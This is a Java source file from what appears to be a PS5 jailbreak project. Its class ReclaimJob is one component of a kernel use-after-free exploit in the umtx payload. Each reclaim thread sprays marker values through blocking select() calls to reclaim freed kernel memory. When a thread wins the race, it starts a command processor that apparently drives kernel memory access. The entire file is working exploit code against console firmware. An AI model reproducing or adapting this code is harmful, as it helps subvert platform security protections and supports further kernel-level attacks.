package org.ps5jb.client.payloads.umtx.impl1;

import org.ps5jb.sdk.core.SdkException;
import org.ps5jb.client.payloads.umtx.common.DebugStatus;
import org.ps5jb.client.payloads.umtx.common.CommandProcessor;
import org.ps5jb.sdk.include.sys.cpuset.CpuSetType;
import org.ps5jb.sdk.core.Pointer;
import org.ps5jb.sdk.include.sys.CpuSet;

public class ReclaimJob extends CommonJob
{
    private final State state;
    private final CpuSet cpuSet;
    private final int index;
    private final int marker;
    private final Pointer markerAddress;
    private final Pointer markerCopyAddress;
    private CpuSetType initialCpuAffinity;
    private boolean isTarget;
    private volatile CommandProcessor commandProcessor;
    
    public ReclaimJob(final int index, final State state) {
        this.cpuSet = new CpuSet(this.libKernel);
        this.index = index;
        this.state = state;
        this.jobName = "reclaim#" + index;
        this.marker = (0x1337 | 65 + index + 1 << 16);
        this.markerAddress = this.state.reclaimJobStatesAddress.inc(index * 16L);
        this.markerCopyAddress = this.markerAddress.inc(8L);
        this.isTarget = false;
    }
    
    @Override
    protected void prepare() throws SdkException {
        super.prepare();
        this.initialCpuAffinity = this.cpuSet.getCurrentThreadAffinity();
        if (DebugStatus.isTraceEnabled()) {
            DebugStatus.trace("Initial CPU affinity of '" + this.jobName + "' = " + this.initialCpuAffinity);
        }
        this.markerAddress.write8((long)this.marker << 32);
    }
    
    @Override
    protected void work() throws SdkException {
        DebugStatus.trace("Waiting for ready flag");
        while (!this.state.readyFlag.get()) {
            this.thread_yield();
        }
        DebugStatus.trace("Starting loop");
        while (!this.state.destroyFlag.get()) {
            DebugStatus.trace("Doing blocking call");
            this.markerAddress.copyTo(this.markerCopyAddress, 0L, 8);
            this.libKernel.select(1, this.markerCopyAddress, Pointer.NULL, Pointer.NULL, this.state.timeoutAddress.getPointer());
            this.thread_yield();
            if (this.isTarget) {
                DebugStatus.info("I am lucky");
                break;
            }
        }
        DebugStatus.trace("Finishing loop");
        if (this.isTarget) {
            DebugStatus.debug("Waiting for ready flag");
            while (!this.state.readyFlag.get()) {
                this.thread_yield();
            }
            DebugStatus.notice("Starting command processor loop");
            this.handleCommands();
            DebugStatus.notice("Stopping command processor loop");
            DebugStatus.notice("Ending target thread");
        }
        else {
            DebugStatus.notice("Not target thread");
        }
    }
    
    @Override
    protected void postprocess() {
        super.postprocess();
        if (this.initialCpuAffinity != null) {
            this.initialCpuAffinity.free();
            this.initialCpuAffinity = null;
        }
        if (this.commandProcessor != null) {
            this.commandProcessor.cmd.set(3);
            this.commandProcessor = null;
        }
    }
    
    protected CommandProcessor getCommandProcessor() {
        return this.commandProcessor;
    }
    
    public boolean isCommandProccesorRunning() {
        return this.commandProcessor != null;
    }
    
    private void handleCommands() {
        if (this.commandProcessor == null) {
            this.commandProcessor = new CommandProcessor();
        }
        this.commandProcessor.handleCommands();
    }
    
    public void setTarget(final boolean flag) {
        this.isTarget = flag;
    }
    
    public boolean isTarget() {
        return this.isTarget;
    }
}
